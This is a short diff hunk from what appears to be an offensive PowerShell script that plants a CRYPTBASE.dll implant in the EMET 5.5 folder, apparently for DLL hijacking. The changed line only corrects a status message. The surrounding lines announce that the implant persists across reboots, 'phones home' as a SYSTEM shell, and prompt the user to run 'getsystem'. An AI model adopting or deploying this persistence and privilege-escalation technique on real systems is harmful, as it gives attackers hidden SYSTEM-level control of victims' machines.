@@ -107,7 +107,7 @@ param (
 		# Check that our implant is in its final location
 		$Implant = "C:\Program Files (x86)\EMET 5.5\CRYPTBASE.dll"
 		if([System.IO.File]::Exists($Implant)){
-			Echo "[*] Done! 'RpcRtRemote.dll' implant successful. Check your shell, run 'getsystem'."
+			Echo "[*] Done! 'CRYPTBASE.dll' implant successful. Check your shell, run 'getsystem'."
 			Echo "[*] Will persist across reboots and phone home as a SYSTEM shell before user login."
 			Start-Sleep -s 3
 			Echo '
